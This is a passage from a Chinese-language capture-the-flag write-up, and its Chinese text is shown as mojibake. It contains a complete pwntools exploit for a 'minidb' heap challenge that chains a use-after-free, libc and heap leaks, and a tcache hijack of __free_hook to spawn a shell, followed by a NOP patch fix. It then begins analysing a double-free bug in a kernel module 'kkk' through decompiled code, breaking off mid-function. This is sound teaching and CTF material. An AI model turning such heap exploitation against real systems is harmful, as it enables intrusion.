æŒ‡å‘å¦ä¸€ä¸ª chunkï¼Œé‡Šæ”¾è¿› unsorted bin åˆ©ç”¨ UAF read æ³„éœ² libc åé‡å–é‡Šæ”¾å› tcache ååŠ«æŒ next æŒ‡é’ˆæ‰“ <code>__free_hook</code> å³å¯</p><blockquote><p>æ„Ÿè§‰ä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œæ¯•ç«Ÿæœ¬æ¥å°±æ˜¯ç­¾åˆ°é¢˜éš¾åº¦ï¼ˆ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯ get shell</p><p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" alt="image.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>ç›´æ¥æŠŠå¤šä½™çš„æ¼æ´æŒ‡ä»¤ç»™ nop æ‰å³å¯</p><p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" alt="image.png"></p><h1 id="0x02-kkkï¼ˆå›°éš¾ï¼‰"><a href="#0x02-kkkï¼ˆå›°éš¾ï¼‰" class="headerlink" title="0x02. kkkï¼ˆå›°éš¾ï¼‰"></a>0x02. kkkï¼ˆå›°éš¾ï¼‰</h1><p>ä¸çŸ¥é“ä¸ºå•¥æ²¡äºº <code>break</code> çš„ä¸€é“é¢˜ç›®ï¼Œæ¼æ´æœ¬èº«åˆ©ç”¨çš„ç©ºé—´ä¹ŸæŒºå¤§çš„ï¼Œè€Œä¸”éƒ½æœ‰å¥½å‡ ä¸ªé˜Ÿä¼ <code>fix</code> æˆåŠŸäº†ï¼Œæ€ä¹ˆæœ€åè§£å¼€çš„é˜Ÿä¼æ•°é‡è¿˜æ˜¯ 0 å‘¢  :ï¼ˆ</p><h2 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¢˜ç›®æä¾›äº†ä¸€ä¸ª <code>kkk.ko</code>ï¼Œæƒ¯ä¾‹æ‹–å…¥ IDAï¼Œå…¶ <code>ioctl()</code> åªæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½â€”â€”è¯»å– <code>k2u</code> é˜Ÿåˆ—ä¸å†™å…¥ <code>u2k</code> é˜Ÿåˆ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™å…¥ <code>u2k</code> é˜Ÿåˆ—é¦–å…ˆä¼šåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ï¼Œä¹‹ååˆ†é…ä¸€ä¸ª object å¹¶å°†æ•°æ®ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºåœ¨é˜Ÿåˆ—å½“ä¸­çš„æ¯ä¸ª object éƒ½åº”å½“å¸¦æœ‰ä¸€ä¸ª <code>header</code> ï¼Œåœ¨ <code>header</code> ä¹‹åæ‰æ˜¯çœŸæ­£çš„ç”¨æˆ·æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»å– <code>k2u</code> é˜Ÿåˆ—åˆ™æ˜¯ç›´æ¥å°†é˜Ÿåˆ—ä¸­çš„ object æ•´ä¸ªæ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œæ³¨æ„åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼š<strong>å³ä½¿æ•°æ®æ‹·è´å¤±è´¥ä¹Ÿä¼šé‡Šæ”¾ objectï¼Œä½†è¯¥ object ä¸ä¼šå‡ºé˜Ÿåˆ—ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿å¾—ä¸€ä¸ª object è¢«å¤šæ¬¡ free</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¯»å– <code>u2k</code> é˜Ÿåˆ—ä¸å†™å…¥ <code>k2u</code> é˜Ÿåˆ—çš„åŠŸèƒ½åœ¨å“ªå®Œæˆå‘¢ï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å›åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨å®Œæˆè®¾å¤‡æ–‡ä»¶æ³¨å†Œåå…¶ä¼šå¯åŠ¨ä¸€ä¸ª CPU æ ¸å¿ƒæ•°ä¸ªå†…æ ¸çº¿ç¨‹ï¼ˆæœ¬é¢˜ä¸º 1 ä¸ªï¼‰ï¼Œè¯¥çº¿ç¨‹ä¼šæ‰§è¡Œå‡½æ•° <code>kkk_msg_handler_fn()</code>ï¼Œè¿™ä¸ªå‡½æ•°æ¯”è¾ƒé•¿æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æ</p><blockquote><p>æœ¬æ¥æƒ³å¼„å¤šä¸ªå†…æ ¸çº¿ç¨‹çš„ï¼Œä½†æ˜¯è¿™æ ·éš¾åº¦å¥½åƒåˆå¤ªé«˜äº†ç‚¹ï¼ˆç¬‘ï¼‰ï¼Œæ‰€ä»¥åªå¼„äº†ä¸€ä¸ª</p></blockquote><p>è¯¥å‡½æ•°æ•´ä½“æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œå¼€å¤´æœ‰ä¸ªå°å¾ªç¯å†…éƒ¨ä¼šå¾ªç¯è½®è¯¢ <code>u2k</code> é˜Ÿåˆ—ï¼Œè‹¥ä¸ä¸ºç©ºåˆ™ä»ä¸­å–å‡ºä¸€ä¸ª objectï¼Œè‹¥ object å¼€å¤´çš„å­—æ®µä¸ä¸º <code>1</code> åˆ™é‡Šæ”¾æ‰å¹¶é‡æ–°ç»§ç»­å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 